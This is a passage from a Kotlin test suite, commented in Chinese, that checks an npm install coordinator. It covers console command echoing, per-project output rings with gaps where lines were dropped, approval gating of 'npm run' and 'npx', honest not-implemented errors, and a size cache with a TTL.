        assertEquals(ErrorCode.ERR_DISK_FULL, ex.error)

        // ② 门禁过了就真排队：执行体收到的是**原样透传**的 argv
        val exec = FakeExecutor()
        val c = coordinator(executor = exec)
        c.runConsoleCommand("p1", "npm install axios@1.7.0")
        assertEquals(listOf("install", "axios@1.7.0"), exec.calls.single().args)
        assertTrue(cHandles(c).isEmpty(), "终态即逐出句柄（与 install 同一条收尾路径）")
    }

    @Test
    fun `控制台输出环按 projectId 过滤，且丢包留洞不静默`() = runBlocking {
        writeManifest("p1", """{"name":"p1","version":"1.0.0"}""")
        writeManifest("p2", """{"name":"p2","version":"1.0.0"}""")
        val c = coordinator()
        c.runConsoleCommand("p1", "npm ls")
        c.runConsoleCommand("p2", "npm ls")

        val p1 = c.consoleOutput("p1", 0, 64).lines
        val p2 = c.consoleOutput("p2", 0, 64).lines
        assertEquals(3, p1.size, "ECHO + OUTPUT + RESULT")
        assertEquals(3, p2.size)
        assertTrue(p1.all { it.seq < p2.first().seq }, "seq 是环内全局单调的，drain 才按 projectId 过滤")

        // 洞：塞满一个环再多一条，最旧那条被丢 —— first > sinceSeq+1 就是「中间丢过」
        val c2 = coordinator()
        writeManifest("p3", """{"name":"p3","version":"1.0.0"}""")
        repeat(InstallCoordinator.RING_CAPACITY + 1) { c2.runConsoleCommand("p3", "npm ls") }
        val snap = c2.consoleOutput("p3", 0, 8)
        assertTrue(snap.firstSeq > 1, "丢最旧必须留洞（firstSeq=${snap.firstSeq}）：静默断流才是要禁的")
        assertEquals(8, snap.lines.size, "batch 截断，未取完的下一批从 lastSeq+1 续")
    }

    @Test
    fun `控制台 npx 与 npm run：先落 ECHO 行再抛，且请求真的入队`() = runBlocking {
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"echo hi"}}""")
        val pkg = layout.projectRoot("p1").resolve("node_modules/tooly")
        Files.createDirectories(pkg)
        Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":"cli.js"}""").toByteArray())
        Files.write(pkg.resolve("cli.js"), "#!/usr/bin/env node\n".toByteArray())

        val c = coordinator()
        val run = assertThrows(AutojsException::class.java) {
            runBlocking { c.runConsoleCommand("p1", "npm run build") }
        }
        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, run.error)
        val npx = assertThrows(AutojsException::class.java) {
            runBlocking { c.runConsoleCommand("p1", "npx tooly") }
        }
        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, npx.error)

        val lines = c.consoleOutput("p1", 0, 64).lines.map { it.line }
        assertEquals(
            listOf("$ npm run build", "$ npx tooly"),
            lines.filter { it.kind == NpmConsoleLineKind.ECHO }.map { it.text },
            "抛之前必须已经回显：否则用户只看到一句错误，不知道自己敲的那行被拒了",
        )
        assertTrue(c.pendingApprovals("p1").isNotEmpty(), "「已入队」得是真的入队，不是错误话术里的一句话")
    }

    @Test
    fun `控制台 npm run 已获批：门禁过了但 spawn 桥未接，如实 ERR_NOT_IMPLEMENTED`() = runBlocking {
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"echo hi"}}""")
        val led = ApprovalLedger()
        approveRunScript(led, "p1", "build")
        val c = coordinator(ledger = led)   // script 缺省 = ScriptOpExecutor.Unavailable

        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.runConsoleCommand("p1", "npm run build") }
        }
        assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, ex.error, "门禁是诚实的：过了也不假装跑过")
        assertTrue(
            c.consoleOutput("p1", 0, 64).lines.any { it.line.kind == NpmConsoleLineKind.ECHO },
            "失败的那次也要留下回显",
        )
    }

    @Test
    fun `控制台输出环收到执行体带出的 npm 输出尾部（不拿摘要冒充）`() = runBlocking {
        val c = coordinator()   // FakeExecutor 的 outputTail = "npm output for install"
        c.install("p1", listOf(PackageSpec("axios")))
        val lines = c.consoleOutput("p1", 0, 64).lines.map { it.line }
        assertTrue(
            lines.any { it.kind == NpmConsoleLineKind.OUTPUT && it.text == "npm output for install" },
            "执行体给了 outputTail 就必须原样显示（实为 $lines）",
        )
        assertEquals(NpmConsoleLineKind.RESULT, lines.last().kind, "终态行必须压在输出之后")
    }

    @Test
    fun `执行体给不出输出时如实说，不拿摘要冒充输出`() = runBlocking {
        val exec = object : HeavyOpExecutor {
            override suspend fun execute(op: HeavyOp, sink: ProgressSink) = HeavyOpOutcome("ok")
        }
        val c = coordinator(executor = exec)
        c.install("p1", listOf(PackageSpec("axios")))
        val lines = c.consoleOutput("p1", 0, 64).lines.map { it.line }
        assertTrue(
            lines.any { it.kind == NpmConsoleLineKind.OUTPUT && it.text.contains("没有捕获到命令输出") },
            "给不出就说给不出（实为 $lines）",
        )
        assertTrue(
            lines.none { it.kind == NpmConsoleLineKind.OUTPUT && it.text == "ok" },
            "摘要不得冒充输出：那会让「npm 什么都没说」与「npm 说了 ok」看起来一样",
        )
    }

    // —— helpers ——

    private fun writeLock(projectId: String, content: String) {
        val f = layout.lockfile(projectId)
        Files.createDirectories(f.parent)
        Files.write(f, (content).toByteArray())
    }

    @Suppress("UNCHECKED_CAST")
    private fun cHandles(c: InstallCoordinator): Map<String, Any> {
        val f = InstallCoordinator::class.java.getDeclaredField("handles")
        f.isAccessible = true
        return f.get(c) as Map<String, Any>
    }

    private fun cProjectLocks(c: InstallCoordinator): Map<String, Any> {
        val f = InstallCoordinator::class.java.getDeclaredField("projectLocks")
        f.isAccessible = true
        return f.get(c) as Map<String, Any>
    }

    // —— P1 T1 helpers ——

    private fun writeManifest(projectId: String, json: String) {
        val root = layout.projectRoot(projectId)
        Files.createDirectories(root)
        Files.write(root.resolve("package.json"), json.toByteArray())
    }

    @Test
    fun `node_modules 尺寸走缓存：TTL 内不重算，过期才重测`() = runBlocking {
        var clock = 1_000_000L
        val c = coordinator(now = { clock })
        val nm = layout.nodeModules("p1")
        Files.createDirectories(nm)
        Files.write(nm.resolve("a.bin"), ByteArray(1000))

        assertEquals(1000L, c.storage()["p1"]!!.totalBytes)

        // TTL 内目录变了也**不**重算：这正是省掉那次全量遍历的代价（陈旧上界 = TTL）
        Files.write(nm.resolve("b.bin"), ByteArray(500))
        assertEquals(1000L, c.storage()["p1"]!!.totalBytes, "TTL 内必须命中缓存，不再遍历")

        clock += InstallCoordinator.SIZE_CACHE_TTL_MILLIS + 1
        assertEquals(1500L, c.storage()["p1"]!!.totalBytes, "TTL 过期必须重测")
    }

    /** 走「未获批 → 自请入队 → 人工批准」完整路径，返回宿主重算出的内容哈希。 */
    private fun approveRunScript(led: ApprovalLedger, projectId: String, name: String): String {
        val hash = NpmScriptResolver.projectScripts(layout.projectRoot(projectId), projectId)!!.versionHash
        val t = led.submit(projectId, "p1|$name", hash, ApprovalAction.RUN_SCRIPT)
        led.resolve(t.requestId, ApprovalDecision.APPROVE)
        return hash
    }

    /** 记录式执行体（真引擎未接时它是 T1 的唯一可断言落点）。每次调用清一次记录面。 */
    private fun recording(): ScriptOpExecutor {
        scriptOps.clear()
        return object : ScriptOpExecutor {
            override suspend fun execute(op: ScriptOp, sink: ProgressSink): String {
                scriptOps += op
                return "ok:" + op.what
            }
        }
    }

    /**
     * 起一个**不挂在当前作用域**的执行协程。
     *
     * 为什么必须脱离：子协程失败会取消父作用域，于是异常从测试方法自己抛出，
     * `assertThrows` 接不到（这正是本条要验的取消竞态，异常就是被断言的那个）。
     */
    private fun detached(block: suspend () -> Unit) = CoroutineScope(Dispatchers.Unconfined).async { block() }

    /** 等句柄入账（执行体在 `execute` 挂起前一定已注册，故这里不会真自旋）。 */
    private suspend fun awaitHandle(c: InstallCoordinator): String {
        while (cHandles(c).isEmpty()) yield()
        return cHandles(c).keys.first().toString()
    }

    private fun runScriptOpCapture(
        projectId: String, manifest: String, name: String, args: List<String>,
    ): ScriptOp {
        writeManifest(projectId, manifest)
        val led = ApprovalLedger()
        approveRunScript(led, projectId, name)
        runBlocking { coordinator(ledger = led, script = recording()).runScript(projectId, name, args) }
        return scriptOps.single()
    }

}
